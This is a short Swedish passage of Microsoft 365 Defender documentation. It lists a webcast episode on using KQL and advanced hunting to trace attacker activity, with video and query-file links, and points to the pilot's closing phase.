|Avsnitt 4: Vi jagar! Tillämpa KQL på incidentspårning|Dags att spåra några attackersaktiviteter! I det här avsnittet använder vi vår förbättrade förståelse av KQL och avancerad sökning i Microsoft 365 Defender för att spåra ett angrepp. Lär dig några av de tips och råd som används i fältet för att spåra attackersaktivitet, till exempel ABCs för cybersäkerhet och hur du tillämpar dem på incidentsvar.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[Avsnitt 4: CSL-fil i Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>Nästa steg

|![Avslutande och sammanfattande fas](../../media/mtp/close.png) <br>[Avslutande och sammanfattande fas](mtp-pilot-close.md)|Analysera dina pilotresultat i Microsoft 365 Defender, presentera dem för dina intressenter och ta nästa steg.
|:-----|:-----|
